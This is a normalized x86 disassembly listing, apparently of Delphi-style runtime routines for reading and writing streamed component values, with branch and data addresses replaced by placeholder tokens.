mov eax [ ebp - 0x4 ]
call sub_420c24
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4176fc
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41fc34
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_420c24
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418264
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_420c24
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417688
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f2dc
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418264
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41fc34
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420178
pop ecx
jmp r-xdata
sub_4205dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_404174
jmp r-xdata
mov eax [ ebx ]
call sub_41b054
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42063c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420957
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_420a24
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_420935
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4208f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_420a48
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_420a48
mov eax [ ebp - 0x1c ]
call sub_41abac
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_420a48
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_420a48
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_4205dc
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_420a48
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4032d8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a8fc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_42089b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_40629c
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41b4f8
xor eax eax
push ebp
push sub_42087b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41b6b0
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420882
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403390
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_41b654
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_4208cc
call sub_402844
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403bd8
jmp r-xdata
call sub_403b84
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41e9d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42093c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4208fb
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41eb78
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403b84
call sub_403bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42093c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403390
sub_420968
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420a12
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4209e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_420c24
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4173c8
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41ecc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41ecf8
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a19
lea eax [ ebp - 0x8 ]
call sub_404120
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420a48
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_420a48
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f1e8
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404210
mov eax esi
call j_sub_4045ec#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41f1e8
pop edx
pop esi
pop ebx
retn
sub_420a84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420b31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41f1c4
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_420b40
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4043a8
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b38
lea eax [ ebp - 0x8 ]
call sub_40482c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_420c24
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41f1e8
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40476c
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41f1e8
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41f1e8
jmp r-xdata
jmp r-xdata
call sub_41ecc0
sub_420b40
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420c17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41f1c4
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_420a84
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404978
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c1e
lea eax [ ebp - 0xc ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_404120
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_420c24
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41f1e8
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404a74
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41f1e8
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41f1e8
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40476c
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41f1e8
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405f3c
jmp r-xdata
jmp r-xdata
call sub_41ecc0
sub_420c38
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_420c74
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_420a48
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c7b
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_420c80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41ee80
test al al
je r-xdata
mov eax [ ebx ]
call sub_420d34
mov eax [ ebx ]
call sub_41fdec
pop ebx
pop ebp
retn
sub_420ca8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41f1e8
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42112c
pop ebx
pop ecx
pop ebp
retn
sub_420cd8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41ee80
test al al
je r-xdata
mov eax [ ebx ]
call sub_41f1c4
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41fdec
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_42112c
jmp r-xdata
mov eax [ ebx ]
call sub_420d34
mov eax [ ebx ]
call sub_41ee80
test al al
je r-xdata
mov eax [ ebx ]
call sub_420ed0
mov eax [ ebx ]
call sub_41fdec
sub_420d34
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420ec3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_420c24
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420eca
lea eax [ ebp - 0x8 ]
call sub_404120
retn
jmp [ eax * 4 + jump_table_420d6b ]
push ebp
call sub_420c80
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_42112c
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_42112c
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_42112c
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_42112c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420a48
jmp r-xdata
push ebp
mov eax 0x1
call sub_420ca8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_420c38
jmp r-xdata
push ebp
mov eax 0x1
call sub_420ca8
pop ecx
jmp r-xdata
push ebp
call sub_420cd8
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_42112c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_42112c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_42112c
jmp r-xdata
push ebp
mov eax 0x2
call sub_420ca8
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_42112c
jmp r-xdata
push ebp
mov eax 0x1
call sub_420ca8
pop ecx
sub_420ed0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_420f0d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_420a48
mov eax ebx
call sub_420d34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f14
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_420f18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_420fb0
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41ee80
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_420a48
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_420a48
jmp r-xdata
mov eax ebx
call sub_420ed0
mov eax ebx
call sub_41fdec
jmp r-xdata
mov eax ebx
call sub_41ee80
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_420f18
mov eax ebx
call sub_41fdec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420fb7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
retn
sub_420fc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_421065
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4041b8
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_423fb0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42106c
lea eax [ ebp - 0x8 ]
call sub_404120
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
sub_421090
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_4210b8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41f118
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_41aaec
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4035bc
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41f118
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_42112c
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41f1e8
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41f1e8
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_421174
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42131d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41ed4c
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4212f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41f1e8
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41dc28
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41f1e8
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e608
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4212d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_420a84
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41f1e8
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41dc28
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41f1e8
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4167c4
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
lea eax [ ebp - 0x1c ]
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d7d4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212da
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub_42133c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421536
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f624
mov eax [ ebp - 0x4 ]
call sub_41f1c4
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
jmp [ eax * 4 + jump_table_42137e ]
mov eax [ ebp - 0x4 ]
call sub_420c24
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fd34
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_413a2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fd34
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_413a2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fd34
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_413a2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fb18
mov eax ebx
call sub_413c24
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fb5c
mov eax ebx
call sub_413c24
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fba0
mov eax ebx
call sub_413c4c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fbf0
mov eax ebx
call sub_413c38
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420a84
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_413c60
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_420b40
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413cdc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_420c24
cmp al 0x9
sete dl
mov eax ebx
call sub_413bfc
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_421174
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f94c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fda0
push edx
push eax
mov eax ebx
call sub_413b28
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42153d
lea eax [ ebp - 0x1c ]
call sub_40f638
lea eax [ ebp - 0xc ]
call sub_40482c
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov eax ebx
call sub_4168ac
jmp r-xdata
sub_421544
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_421710
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e650
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42157c
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_423620
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_4215a4
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_423620
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_421688
sub_4215e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41dba4
cmp eax esi
jg r-xdata
mov eax ebx
call sub_421710
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41dbc4
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_42163c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_421710
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_421688
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4216ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_42385c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_42163c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_42163c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421706
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_42173c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42177f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404308
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_423754
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421786
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_42178c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_42181e
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_42385c
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_421ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421825
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_41c3c4
mov ebx eax
